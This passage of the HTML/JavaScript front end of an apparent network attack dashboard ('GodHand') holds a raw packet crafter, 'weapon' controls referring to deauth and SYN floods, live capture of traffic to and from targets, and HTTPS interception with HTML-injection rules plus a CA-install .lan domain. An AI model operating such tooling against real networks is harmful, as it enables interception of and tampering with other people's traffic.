        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="URG"> URG</label>
      </div>
      <div class="row" id="pkt-icmp-row" style="display:none;">
        <input type="number" id="pkt-icmp-type" placeholder="ICMP type" value="8">
        <input type="number" id="pkt-icmp-code" placeholder="ICMP code" value="0">
      </div>
      <div class="row" id="pkt-rawproto-row" style="display:none;">
        <input type="number" id="pkt-ip-proto" placeholder="IP protocol number (0-255)" value="253" min="0" max="255">
      </div>
      <div class="row">
        <textarea id="pkt-payload" placeholder="Payload"></textarea>
      </div>
      <label class="row" style="align-items:center; cursor:pointer;">
        <input type="checkbox" id="pkt-payload-hex"> Payload is hex (e.g. deadbeef or de:ad:be:ef)
      </label>
      <div class="row">
        <input type="number" id="pkt-count" placeholder="Send count" value="1" min="1" max="50">
        <input type="number" id="pkt-interval" placeholder="Interval ms" value="0" min="0" max="5000">
        <button class="btn" onclick="sendCustomPacket()">Send packet</button>
      </div>
      <div id="pkt-result" class="status-message" style="display:none;"></div>
    </div>
  </div>

  <div id="tab-monitor" class="tab-content">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Traffic capture &amp; analysis</h2>
        <span id="traffic-capturing-badge"></span>
      </div>
      <p class="sub">Live analysis of traffic to/from your targets — start weapon 5 (Traffic Capture) on the Attacks tab to populate this.</p>
      <div class="stat-row">
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-total">0</span><span class="stat-label">Connections</span></div>
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-hosts">0</span><span class="stat-label">Unique hosts</span></div>
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-bytes">0 B</span><span class="stat-label">Total data</span></div>
      </div>
      <svg id="traffic-spark" viewBox="0 0 300 50" preserveAspectRatio="none" class="sparkline">
        <polyline id="traffic-spark-line" points=""></polyline>
      </svg>
      <p class="sub" style="margin-top:8px; margin-bottom:0;">Connections per 2s, last 60s</p>
    </div>
    <div class="card">
      <h2>Top talkers</h2>
      <p class="sub">Hosts moving the most data, by total bytes seen.</p>
      <div class="table-responsive">
        <table>
          <thead><tr><th>Host</th><th>Connections</th><th>Data</th></tr></thead>
          <tbody id="traffic-talkers-body"></tbody>
        </table>
      </div>
      <div class="empty" id="traffic-talkers-empty">No traffic captured yet.</div>
    </div>
    <div class="card">
      <h2>Top ports &amp; services</h2>
      <div class="table-responsive">
        <table>
          <thead><tr><th>Service</th><th>Port</th><th>Protocol</th><th>Connections</th><th>Data</th></tr></thead>
          <tbody id="traffic-ports-body"></tbody>
        </table>
      </div>
      <div class="empty" id="traffic-ports-empty">No traffic captured yet.</div>
    </div>
    <div class="card">
      <h2>Live packet feed</h2>
      <p class="sub">Every IPv4 TCP/UDP/ICMP packet to or from your targets — compact Wireshark-style view. Click any row to expand details and hexdump.</p>
      <div id="packet-capture-container">
        <div class="packet-toolbar">
          <div style="display:grid; grid-template-columns:1fr 1fr 1fr auto; gap:8px; width:100%; align-items:end;">
            <div>
              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Protocol</label>
              <select id="filter-proto" onchange="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
                <option value="">All</option>
                <option value="tcp">TCP only</option>
                <option value="udp">UDP only</option>
                <option value="icmp">ICMP only</option>
              </select>
            </div>
            <div>
              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">IP Filter</label>
              <input type="text" id="filter-ip" placeholder="Filter by IP" onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
            </div>
            <div>
              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Search</label>
              <input type="text" id="filter-info" placeholder="Port, SNI, DNS..." onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
            </div>
            <div style="display:flex; gap:6px;">
              <button onclick="clearPacketFilters()" style="padding:6px 12px; background:#444; color:#0f0; border:1px solid #555; border-radius:4px; cursor:pointer; font-size:0.85rem;">Clear</button>
              <button onclick="exportPacketsCSV()" style="padding:6px 12px; background:#444; color:#0f0; border:1px solid #555; border-radius:4px; cursor:pointer; font-size:0.85rem;">Export</button>
            </div>
          </div>
        </div>
        <div id="packetList" style="border:1px solid #444; border-radius:4px; max-height:380px; overflow-y:auto; background:#0a0a0a;">
          <!-- Packets rendered dynamically -->
        </div>
      </div>
      <div class="empty" id="traffic-empty" style="display:none;">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
    </div>
    <div class="card">
      <h2>Reassembled HTTP streams</h2>
      <p class="sub">Fragmented HTTP requests/responses stitched back together from their TCP segments in sequence order — not just what a single packet's first line shows.</p>
      <div id="tcp-streams-list"></div>
      <div class="empty" id="tcp-streams-empty">No HTTP streams reassembled yet.</div>
    </div>
    <div class="card">
      <h2>Paste an ARP snapshot</h2>
      <p class="sub">Run <code>arp -a</code> and paste output below. Detects MAC changes.</p>
      <textarea id="arp-input" placeholder="e.g. 192.168.1.1 aa:bb:cc:dd:ee:ff"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
        <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
      </div>
      <p class="sub" style="margin-top:10px;">Snapshots analyzed: <span id="arp-snap-count">0</span></p>
    </div>
    <div class="card">
      <h2>Paste deauth / frame-count log</h2>
      <p class="sub">Format: numbers separated by comma or newline.</p>
      <textarea id="deauth-input" placeholder="2,3,1,4,2,58,61,2,3"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
      </div>
    </div>
    <div class="card">
      <h2>Alerts</h2>
      <div id="alerts"></div>
      <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
    </div>
    <div class="card">
      <h2>Activity log (server-side)</h2>
      <p class="sub">All actions are logged on the server.</p>
      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
      <div class="log-container" id="log-container"></div>
    </div>
  </div>

  <div id="tab-https" class="tab-content">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">HTTPS traffic monitor</h2>
        <span id="https-status-badge">Inactive</span>
      </div>
      <p class="sub">Real-time HTTPS interception: monitor encrypted traffic, inspect requests/responses, and apply injection rules.</p>
      <div class="stat-row">
        <div class="stat-tile"><span class="stat-value" id="https-stat-total">0</span><span class="stat-label">Requests</span></div>
        <div class="stat-tile"><span class="stat-value" id="https-stat-hosts">0</span><span class="stat-label">Domains</span></div>
        <div class="stat-tile"><span class="stat-value" id="https-stat-injected">0</span><span class="stat-label">Injected</span></div>
      </div>
    </div>

    <div class="card">
      <h2>Live HTTPS traffic</h2>
      <div class="table-responsive" style="max-height:400px; overflow-y:auto;">
        <table>
          <thead>
            <tr>
              <th style="min-width:150px;">Timestamp</th>
              <th style="min-width:200px;">Domain</th>
              <th>Method</th>
              <th>Path</th>
              <th>Status</th>
              <th style="min-width:100px;">Size</th>
            </tr>
          </thead>
          <tbody id="https-traffic-body">
            <tr><td colspan="6" style="text-align:center; color:#999;">No HTTPS traffic captured yet. Gateway services must be running.</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <div class="card">
      <h2>Response injection rules</h2>
      <p class="sub">Create rules to modify HTTPS responses: inject headers, remove headers, replace content, inject HTML.</p>

      <div style="margin-bottom:16px; padding:12px; background:#1a1a1a; border:1px solid #444; border-radius:4px;">
        <h3 style="margin-top:0; margin-bottom:8px; font-size:0.95rem;">New rule</h3>
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:8px;">
          <div>
            <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Domain pattern (*.example.com)</label>
            <input type="text" id="rule-hostname" placeholder="*.example.com or *" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
          </div>
          <div>
            <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Action type</label>
            <select id="rule-action" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
              <option value="add_header">Add header</option>
              <option value="remove_header">Remove header</option>
              <option value="replace_body">Replace text</option>
              <option value="inject_html">Inject HTML</option>
            </select>
          </div>
        </div>
        <div>
          <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Value</label>
          <textarea id="rule-value" placeholder="Header-Name: value  OR  search|replace  OR  HTML code" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px; min-height:60px; font-family:monospace; font-size:0.85rem;"></textarea>
        </div>
        <div style="display:flex; gap:8px; margin-top:8px;">
          <button class="btn" onclick="createInjectionRule()" style="flex:1;">Create rule</button>
          <button class="btn secondary" onclick="clearRuleForm()" style="flex:1;">Clear</button>
        </div>
      </div>

      <div id="rules-container">
        <p style="color:#999; text-align:center;">Loading rules...</p>
      </div>
    </div>

    <div class="card">
      <h2>.lan domain management</h2>
      <p class="sub">Configure custom .lan domains for transparent proxy discovery (e.g., pac.installCA.lan).</p>

      <div style="display:flex; gap:8px; margin-bottom:12px;">
        <input type="text" id="lan-domain-input" placeholder="custom.lan" style="flex:1; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
        <button class="btn" onclick="addLanDomain()" style="min-width:100px;">Add domain</button>
      </div>

      <div id="lan-domains-list">
        <p style="color:#999; text-align:center;">Loading domains...</p>
      </div>
    </div>
  </div>
</main>

<div id="modal-overlay" class="modal-overlay" style="display:none;">
  <div class="modal">
    <h3 id="modal-title">Confirm</h3>
    <p id="modal-message"></p>
    <div style="display:flex; gap:10px; justify-content:flex-end;">
      <button class="btn secondary" onclick="closeModal()">Cancel</button>
      <button class="btn danger" id="modal-confirm-btn" onclick="confirmModalAction()">Confirm</button>
    </div>
  </div>
</div>

<div id="nmap-modal-overlay" class="modal-overlay" style="display:none;">
  <div class="modal wide">
    <h3>Nmap scan — <span id="nmap-modal-ip"></span></h3>
    <div id="nmap-modal-body"></div>
    <div style="display:flex; gap:10px; justify-content:flex-end; margin-top:16px;">
      <button class="btn secondary" onclick="closeNmapModal()">Close</button>
    </div>
  </div>
</div>

<div class="toast-container" id="toast-container"></div>
</div>

<script>
// Global state
let selectedWeapon = 1;
let currentTargets = [];
let currentHosts = [];
let attackRunning = {};   // weapon_id -> true/false
let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');
let authToken = localStorage.getItem('godhand_token') || '';
let modalAction = null;
let watchWholeNetwork = localStorage.getItem('lg_watch_whole_network') === '1';
let bwRxHistory = [];
let bwTxHistory = [];

// Helper: API call
async function apiCall(endpoint, method='GET', data=null) {
  const headers = {'Content-Type': 'application/json'};
  if (authToken) headers['Authorization'] = 'Bearer ' + authToken;
  const opts = { method, headers };
  if (data) opts.body = JSON.stringify(data);
  const res = await fetch('/api/' + endpoint, opts);
  if (res.status === 401) {
    authToken = '';
    localStorage.removeItem('godhand_token');
    showLogin();
    throw new Error('Unauthorized');
  }
  return res.json();
}

// Toasts
function showToast(message, type='success') {
  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');
  toast.className = 'toast ' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

// Modal
function openModal(title, message, action) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-message').textContent = message;
  modalAction = action;
  document.getElementById('modal-overlay').style.display = 'flex';
}
function closeModal() {
  document.getElementById('modal-overlay').style.display = 'none';
  modalAction = null;
}
function confirmModalAction() {
  if (modalAction) modalAction();
  closeModal();
}

// Nmap scan modal
let nmapTargetIp = null;
function openNmapModal(ip) {
  nmapTargetIp = ip;
  document.getElementById('nmap-modal-ip').textContent = ip;
  document.getElementById('nmap-modal-body').innerHTML = `
    <p class="sub">Choose a scan type for <strong>${ip}</strong>:</p>
    <div class="row">
      <button class="btn" onclick="runNmapModal(false)">Quick scan (top 100 ports)</button>
      <button class="btn secondary" onclick="runNmapModal(true)">Full scan (all 65535 ports — slow)</button>
    </div>
  `;
  document.getElementById('nmap-modal-overlay').style.display = 'flex';
}
function closeNmapModal() {
  document.getElementById('nmap-modal-overlay').style.display = 'none';
  nmapTargetIp = null;
}
async function runNmapModal(full) {
  const ip = nmapTargetIp;
  const body = document.getElementById('nmap-modal-body');
  body.innerHTML = `
    <p class="sub">Running a ${full ? 'full' : 'quick'} scan on ${ip}${full ? ' — this can take several minutes' : ''}...</p>
    <div style="text-align:center; padding:30px 0;"><span class="spinner"></span></div>
  `;
  const res = await apiCall('nmap_scan?ip=' + encodeURIComponent(ip) + '&full=' + (full ? '1' : '0'));
  if (!res.success) {
    body.innerHTML = `<p class="sub" style="color:var(--danger);">Scan failed: ${res.error}</p>`;
    return;
  }
  if (!res.ports.length) {
    body.innerHTML = `<p class="sub">No open ports found on ${ip}.</p>`;
    return;
  }
  const rows = res.ports.map(p => `
    <tr>
      <td data-label="Port">${p.port}/${p.protocol}</td>
      <td data-label="State"><span class="badge ${p.state === 'open' ? 'success' : 'warning'}">${p.state}</span></td>
      <td data-label="Service">${p.service}</td>
      <td data-label="Version">${p.version || '—'}</td>
    </tr>
  `).join('');
  body.innerHTML = `
    <div class="table-responsive">
      <table>
        <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
  `;
}

// Tabs
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
    if (btn.dataset.tab === 'attacks') { refreshDeauthCapability(); refreshSynFloodCapability(); }
  });
});

// Weapon selection
document.querySelectorAll('.weapon-btn').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.weapon-btn').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    selectedWeapon = parseInt(el.dataset.w, 10);
  });
});

// Global status
function updateGlobalStatus(text, running=false) {
  document.getElementById('status-text').textContent = text;
  const dot = document.getElementById('status-dot');
  dot.className = 'status-dot' + (running ? ' running' : '');
}

// Poll logs
async function pollLogs() {
  try {
    const data = await apiCall('logs');
    const container = document.getElementById('log-container');
    container.innerHTML = '';
    data.logs.slice(-100).forEach(entry => {
      const div = document.createElement('div');
      div.className = 'log-entry ' + entry.level;
      div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${entry.msg}</span>`;
      container.appendChild(div);
    });
    container.scrollTop = container.scrollHeight;
  } catch(e) {}
}
function clearServerLogs() {
  apiCall('clear_logs', 'POST').then(pollLogs);
}

// Live traffic capture
function formatPacketInfo(e) {
  if (e.proto === 'tcp') {
    const flags = e.flags && e.flags.length ? ` [${e.flags.join(', ')}]` : '';
    let base = `${e.sp} → ${e.dp}${flags} Len=${e.len}`;
    if (e.http_info) base += ` — ${e.http_info}`;
    else if (e.tls_sni) base += ` — TLS SNI: ${e.tls_sni}`;
    return base;
  }
  if (e.proto === 'udp') {
    let base = `${e.sp} → ${e.dp} Len=${e.len}`;
    if (e.dns_query) base += ` — DNS query: ${e.dns_query}`;
    return base;
  }
  if (e.proto === 'icmp') {
    return `${e.icmp_type || 'icmp'} Len=${e.len}`;
  }
  return `Len=${e.len}`;
}
function formatPacketRow(e) {
  const time = new Date(e.t * 1000);
  const hh = String(time.getHours()).padStart(2, '0');
  const mm = String(time.getMinutes()).padStart(2, '0');
  const ss = String(time.getSeconds()).padStart(2, '0');
  const ms = String(time.getMilliseconds()).padStart(3, '0');
  const badgeClass = e.proto === 'tcp' ? 'info' : e.proto === 'udp' ? 'success' : 'warning';
  const dirArrow = e.dir === 'out' ? '↑' : '↓';
  return `
    <tr>
      <td data-label="No.">${e.no}</td>
      <td data-label="Time">${hh}:${mm}:${ss}.${ms}</td>
      <td data-label="Dir">${dirArrow}</td>
      <td data-label="Source">${escapeHtml(e.src)}</td>
      <td data-label="Destination">${escapeHtml(e.dst)}</td>
      <td data-label="Proto"><span class="badge ${badgeClass}">${e.proto.toUpperCase()}</span></td>
      <td data-label="Length">${e.len}</td>
      <td data-label="Info">${escapeHtml(formatPacketInfo(e))}</td>
    </tr>
  `;
}

function formatPacketRowCompact(e, idx) {
  const time = new Date(e.t * 1000);
  const hh = String(time.getHours()).padStart(2, '0');
  const mm = String(time.getMinutes()).padStart(2, '0');
  const ss = String(time.getSeconds()).padStart(2, '0');
  const ms = String(time.getMilliseconds()).padStart(3, '0');
  const timeStr = `${hh}:${mm}:${ss}.${ms}`;

  const dirArrow = e.dir === 'out' ? '↑' : '↓';
  const protoClass = e.proto.toLowerCase();
  const summary = formatPacketInfo(e);

  const hexdump = e.raw ? toHexdump(e.raw) : '(no raw data)';
  const detail = formatPacketDetailView(e, hexdump);

  return `
    <div class="packet-row" data-packet-idx="${idx}" data-packet-no="${e.no}">
      <span class="expand-icon">▶</span>
      <span class="time">${timeStr}</span>
      <span class="addr">${escapeHtml(e.src)}</span>
      <span class="addr">${escapeHtml(e.dst)}</span>
      <span class="proto ${protoClass}">${e.proto.toUpperCase()}</span>
      <span class="len">${e.len}B</span>
      <span class="summary">${escapeHtml(summary)}</span>
      <div class="packet-detail">${detail}</div>
    </div>
  `;
}

function togglePacketDetail(e) {
  if (e.target.classList.contains('packet-row')) {
    e.target.classList.toggle('expanded');
  } else {
    e.target.closest('.packet-row').classList.toggle('expanded');
  }
}

function formatPacketDetailView(e, hexdump) {
  let html = '<div class="packet-detail-header">Packet #' + e.no + ' Details</div>';
  html += '<div style="margin-bottom:8px;">';
  html += 'Source: ' + escapeHtml(e.src) + (e.sp ? ':' + e.sp : '') + '<br>';
  html += 'Destination: ' + escapeHtml(e.dst) + (e.dp ? ':' + e.dp : '') + '<br>';
  html += 'Protocol: ' + e.proto.toUpperCase() + '<br>';
  html += 'Length: ' + e.len + ' bytes<br>';
  if (e.flags && e.flags.length) html += 'Flags: ' + e.flags.join(', ') + '<br>';
  if (e.tls_sni) html += 'TLS SNI: ' + escapeHtml(e.tls_sni) + '<br>';
  if (e.dns_query) html += 'DNS Query: ' + escapeHtml(e.dns_query) + '<br>';
  if (e.http_info) html += 'HTTP: ' + escapeHtml(e.http_info) + '<br>';
  html += '</div>';
  html += '<div class="hexdump">' + hexdump + '</div>';
  return html;
}

function toHexdump(raw) {
  if (!raw) return '(no data)';
  const bytes = typeof raw === 'string' ? raw : String(raw);
  let hex = '';
  for (let i = 0; i < Math.min(bytes.length, 256); i += 16) {
    const chunk = bytes.substr(i, 16);
    const hexPart = Array.from(chunk).map((c, j) => {
      const cc = typeof c === 'string' ? c.charCodeAt(0) : c;
      return (cc < 16 ? '0' : '') + cc.toString(16);
    }).join(' ');
    const asciiPart = chunk.replace(/[^\x20-\x7E]/g, '.');
    hex += String(i).padStart(4, '0') + ':  ' + hexPart.padEnd(48) + '  ' + asciiPart + '\n';
  }
  return hex;
}

function exportPacketsCSV() {
  if (TRAFFIC_ALL_ENTRIES.length === 0) {
    alert('No packets to export');
    return;
  }

  let csv = 'No,Time,Dir,Source,Destination,Protocol,Length,Info\n';
  TRAFFIC_ALL_ENTRIES.forEach(e => {
    const time = new Date(e.t * 1000).toISOString();
    const dir = e.dir === 'out' ? 'Out' : 'In';
    const summary = formatPacketInfo(e).replace(/"/g, '""');
    csv += `"${e.no}","${time}","${dir}","${e.src}","${e.dst}","${e.proto}","${e.len}","${summary}"\n`;
  });

  const blob = new Blob([csv], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = 'packets-' + new Date().toISOString().split('T')[0] + '.csv';
  link.click();
  URL.revokeObjectURL(url);
}
var TRAFFIC_ALL_ENTRIES = [];
async function pollTrafficCapture() {
  try {
    const res = await apiCall('monitor_log');
    TRAFFIC_ALL_ENTRIES = res.entries || [];
    const packetList = document.getElementById('packetList');
    const empty = document.getElementById('traffic-empty');
    if (TRAFFIC_ALL_ENTRIES.length) {
      empty.style.display = 'none';
      applyPacketFilters();
      packetList.scrollTop = packetList.scrollHeight;
    } else {
      empty.style.display = 'block';
      packetList.innerHTML = '';
      empty.textContent = res.capturing
        ? 'Capturing... waiting for matching traffic.'
        : 'Not capturing. Select weapon 5 on the Attacks tab and press Start.';
    }
    const attacksStatus = document.getElementById('attacks-traffic-status');
    if (attacksStatus) {
      const n = TRAFFIC_ALL_ENTRIES.length;
      attacksStatus.textContent = res.capturing
        ? `Capturing — ${n} recent packet(s) logged. See the Monitor tab for the full analysis panel.`
        : 'Not capturing.';
    }
  } catch(e) {}
  refreshTrafficStats();
  refreshTcpStreams();
}

function applyPacketFilters() {
  const proto = document.getElementById('filter-proto').value.toLowerCase();
  const ip = document.getElementById('filter-ip').value.toLowerCase();
  const info = document.getElementById('filter-info').value.toLowerCase();

  const filtered = TRAFFIC_ALL_ENTRIES.filter(e => {
    if (proto && e.proto !== proto) return false;
    if (ip && !e.src.toLowerCase().includes(ip) && !e.dst.toLowerCase().includes(ip)) return false;
    if (info) {
      const infoStr = (formatPacketInfo(e) + '').toLowerCase();
      if (!infoStr.includes(info)) return false;
    }
    return true;
  });

  const packetList = document.getElementById('packetList');
  if (filtered.length === 0) {
    packetList.innerHTML = '<div style="padding:20px; text-align:center; color:#666;">No packets match filters.</div>';
    return;
  }

  packetList.innerHTML = filtered.map((e, idx) => formatPacketRowCompact(e, idx)).join('');

  // Attach click handlers for expand/collapse
  document.querySelectorAll('.packet-row').forEach(row => {
    row.addEventListener('click', togglePacketDetail);
  });
}

function clearPacketFilters() {
  document.getElementById('filter-proto').value = '';
  document.getElementById('filter-ip').value = '';
  document.getElementById('filter-info').value = '';
  applyPacketFilters();
}

function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = s == null ? '' : String(s);
  return div.innerHTML;
}

function formatBytes(n) {
  if (n > 1024 * 1024) return (n / 1024 / 1024).toFixed(2) + ' MB';
  if (n > 1024) return (n / 1024).toFixed(1) + ' KB';
  return n + ' B';
}
async function refreshTrafficStats() {
  try {
    const res = await apiCall('traffic_stats');
    if (!res.success) return;
    document.getElementById('traffic-capturing-badge').innerHTML =
      `<span class="badge ${res.capturing ? 'success' : 'info'}">${res.capturing ? 'Capturing' : 'Idle'}</span>`;
    document.getElementById('traffic-stat-total').textContent = res.total;
    document.getElementById('traffic-stat-hosts').textContent = res.unique_hosts;
    document.getElementById('traffic-stat-bytes').textContent = formatBytes(res.total_bytes);

    const w = 300, h = 50, pad = 3;
    const max = Math.max(1, ...res.timeline);
    const points = res.timeline.map((v, i) => {
      const x = res.timeline.length > 1 ? (i / (res.timeline.length - 1)) * w : 0;
      const y = h - pad - (v / max) * (h - pad * 2);
      return `${x.toFixed(1)},${y.toFixed(1)}`;
    }).join(' ');
    document.getElementById('traffic-spark-line').setAttribute('points', points);

    const talkersBody = document.getElementById('traffic-talkers-body');
    const talkersEmpty = document.getElementById('traffic-talkers-empty');
    talkersEmpty.style.display = res.top_talkers.length ? 'none' : 'block';
    talkersBody.innerHTML = res.top_talkers.map(t => `
      <tr>
        <td data-label="Host">${escapeHtml(t.host)}</td>
        <td data-label="Connections">${t.count}</td>
        <td data-label="Data">${formatBytes(t.bytes)}</td>
      </tr>
    `).join('');

    const portsBody = document.getElementById('traffic-ports-body');
    const portsEmpty = document.getElementById('traffic-ports-empty');
    portsEmpty.style.display = res.top_ports.length ? 'none' : 'block';
    portsBody.innerHTML = res.top_ports.map(p => `
      <tr>
        <td data-label="Service">${escapeHtml(p.service)}</td>
        <td data-label="Port">${p.port}</td>
        <td data-label="Protocol">${p.proto.toUpperCase()}</td>
        <td data-label="Connections">${p.count}</td>
        <td data-label="Data">${formatBytes(p.bytes)}</td>
      </tr>
    `).join('');
  } catch(e) {}
}

function formatStreamBadge(s) {
  if (s.gap_detected) return '<span class="badge warning">Partial (gap)</span>';
  if (s.complete) return '<span class="badge success">Complete</span>';
  return '<span class="badge info">Assembling…</span>';
}
async function refreshTcpStreams() {
  try {
    const res = await apiCall('tcp_streams');
    if (!res.success) return;
    const list = document.getElementById('tcp-streams-list');
    const empty = document.getElementById('tcp-streams-empty');
    if (!res.streams.length) {
      list.innerHTML = '';
      empty.style.display = 'block';
      return;
    }
    empty.style.display = 'none';
    list.innerHTML = res.streams.map(s => {
      const headerLines = Object.entries(s.headers || {}).map(([k, v]) =>
        `${escapeHtml(k)}: ${escapeHtml(v)}`).join('\n');
      const note = s.note ? `<div class="empty-inline" style="margin-top:4px;">${escapeHtml(s.note)}</div>` : '';
      const bodyBlock = s.body_preview
        ? `<div class="log-container" style="margin-top:8px; white-space:pre-wrap; word-break:break-word;">${escapeHtml(s.body_preview)}${s.body_truncated ? '\n[truncated]' : ''}</div>`
        : '';
      return `
        <div class="status-message" style="text-align:left; margin-bottom:12px;">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:6px;">
            <strong style="font-family:'JetBrains Mono',monospace; font-size:0.85rem;">${escapeHtml(s.src)}:${s.sp} → ${escapeHtml(s.dst)}:${s.dp}</strong>
            <span>${formatStreamBadge(s)} <span class="empty-inline">${s.packet_count} segment(s), ${formatBytes(s.total_bytes)}</span></span>
          </div>
          ${s.status_line ? `<div style="font-family:'JetBrains Mono',monospace; font-weight:600;">${escapeHtml(s.status_line)}</div>` : '<div class="empty-inline">Still assembling headers…</div>'}
          ${headerLines ? `<div class="log-container" style="margin-top:6px; white-space:pre-wrap;">${headerLines}</div>` : ''}
          ${note}
          ${bodyBlock}
        </div>
      `;
    }).join('');
  } catch(e) {}
}

// Live bandwidth
function formatBps(bps) {
  if (bps > 1024 * 1024) return (bps / 1024 / 1024).toFixed(2) + ' MB/s';
  if (bps > 1024) return (bps / 1024).toFixed(1) + ' KB/s';
  return Math.round(bps) + ' B/s';
}
function drawBandwidthSparkline() {
  const max = Math.max(1, ...bwRxHistory, ...bwTxHistory);
  const w = 300, h = 56, pad = 4;
  const toPoints = (arr) => arr.map((v, i) => {
    const x = arr.length > 1 ? (i / (arr.length - 1)) * w : 0;
    const y = h - pad - (v / max) * (h - pad * 2);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(' ');
  document.getElementById('bw-spark-rx').setAttribute('points', toPoints(bwRxHistory));
  document.getElementById('bw-spark-tx').setAttribute('points', toPoints(bwTxHistory));
}
async function pollBandwidth() {
  try {
    const res = await apiCall('bandwidth');
    const empty = document.getElementById('bw-empty');
    if (!res.success) {
      empty.style.display = 'block';
      empty.textContent = res.error || 'No bandwidth data available.';
      return;
    }
    empty.style.display = 'none';
    document.getElementById('bw-rx').textContent = formatBps(res.rx_bps) + ' ↓';
    document.getElementById('bw-tx').textContent = formatBps(res.tx_bps) + ' ↑';
    bwRxHistory.push(res.rx_bps);
    bwTxHistory.push(res.tx_bps);
    if (bwRxHistory.length > 40) bwRxHistory.shift();
    if (bwTxHistory.length > 40) bwTxHistory.shift();
    drawBandwidthSparkline();
  } catch(e) {}
}

// Gateway: DNS/VPN/proxy
async function refreshGatewayStatus() {
  try {
    const res = await apiCall('gateway/status');
    if (!res.success) return;
    document.getElementById('gw-local-ip').textContent = res.local_ip;
    document.getElementById('gw-external-ip').textContent = res.external_ip;
    document.getElementById('gw-dns-target').textContent = res.local_ip + ':' + 5335;
    document.getElementById('gw-proxy-target').textContent = res.local_ip + ':' + res.proxy.port;

    document.getElementById('gw-dns-badges').innerHTML = `
      <span class="badge ${res.dns.unbound ? 'success' : 'danger'}">Unbound ${res.dns.unbound ? 'up' : 'down'}</span>
      <span class="badge ${res.dns.dnscrypt ? 'success' : 'danger'}">DNSCrypt-proxy ${res.dns.dnscrypt ? 'up' : 'down'}</span>
    `;
    document.getElementById('gw-dns-status').textContent = `Blocklist: ${res.dns.blocklist_domains} domain(s) loaded.`;

    const vpnBox = document.getElementById('gw-vpn-status');
    if (res.vpn.active) {
      const which = res.vpn.wireguard ? 'WireGuard' : res.vpn.openvpn ? 'OpenVPN' : 'Cloudflare';
      vpnBox.innerHTML = `<span class="badge success">Active</span> ${which} tunnel detected — full-tunnel privacy.`;
    } else {
      vpnBox.innerHTML = `<span class="badge warning">Not detected</span> DNS is private, but your IP is still visible to sites you visit.`;
    }

    document.getElementById('gw-proxy-badge').innerHTML =
      `<span class="badge ${res.proxy.tinyproxy ? 'success' : 'danger'}">${res.proxy.tinyproxy ? 'Running' : 'Stopped'}</span>`;
    document.getElementById('gw-proxy-status').textContent = res.proxy.tinyproxy
      ? `Running on port ${res.proxy.port}. Point other devices' HTTP proxy at ${res.local_ip}:${res.proxy.port}.`
      : 'Not running.';
  } catch(e) {}
  refreshDdnsStatus();
  refreshNgrokStatus();
}
async function startGatewayDns() {
  openModal('Start DNS privacy stack',
    'This stops any Unbound or DNSCrypt-proxy process already running on this device, even one you started outside GodHand, and replaces it with a fresh instance. If other devices are already using this host as their DNS server, they will see a few seconds of DNS downtime during the restart. Continue?',
    async () => {
      showToast('Starting DNS privacy stack...', 'success');
      const res = await apiCall('gateway/dns/start', 'POST');
      showToast(res.status || res.error, res.success ? 'success' : 'error');
      refreshGatewayStatus();
    });
}
async function stopGatewayDns() {
  openModal('Stop DNS privacy stack',
